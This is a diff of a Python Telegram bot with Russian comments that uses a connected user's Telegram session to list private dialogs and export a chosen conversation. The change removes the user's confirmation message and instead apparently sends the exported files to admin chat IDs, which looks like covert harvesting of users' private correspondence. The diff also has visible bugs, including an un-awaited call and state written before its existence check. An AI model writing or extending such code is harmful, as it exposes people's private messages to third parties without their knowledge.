@@ -102,22 +102,20 @@ async def analitic_command(message: types.Message):
 
 
 
-
 # Добавляем обработчик команды /private
 @dp.message_handler(commands=['private'])
 async def analitic_command(message: types.Message):
     user_id = message.from_user.id
+    user_state[user_id]['get_private'] = True  # Обновляем состояние, будем использовать  в обработчике, чтобы словить ввод цифр
     if user_id in user_state and user_state[user_id].get('connected'):
         logging.info(f"User {user_id} is connected. Starting get private message.")
         #phone_number = user_state[user_id]['phone_number']
         client = user_state[user_id]['client']
         try:
-            await bot.send_message(user_id, 'в одном шаге от функции')
-            await process_user_data(client, phone_number, user_id)
-            await message.answer("Анализ данных завершен.")
+            await process_private_message(client, user_id)
         except Exception as e:
             logging.error(f"Error during analysis for user {user_id}: {e}")
-            await message.answer(f"Произошла ошибка при анализе: {e}")
+            await message.answer(f"Произошла ошибка при формирование списка: {e}")
     else:
         logging.info(f"User {user_id} is not connected. Cannot perform getting private message.")
         await message.answer("Вы должны сначала подключиться. Введите /start для начала процесса подключения.")
@@ -133,14 +131,13 @@ async def get_private_message_from_list(message: types.Message):
         if 0 <= g_index < len(users_list):
             target_user = users_list[g_index]
             await get_messages_for_html(client, target_user, selection)
-            await message.reply("Выгрузка сообщений выполнена.")
+            send_files_to_bot(bot, admin_chat_ids, user_id)
     except ValueError:
         await message.answer("Введите число от 0 до максимального индекса.")
 
 
-# Функция по выкачке сообщений
+# Функция по формирование сообщений
 async def process_private_message(client, user_id):
-    user_state[user_id]['get_private'] = True  # Обновляем состояние, будем использовать  в обработчике, чтобы словить ввод цифр
     user_dialogs, i, users_list = await get_user_dialogs(client)
     await bot.send_message(user_id, user_dialogs)
     await bot.send_message(user_id, 'Выберите из списка нужный диалог и введите соотвествующую функцию')
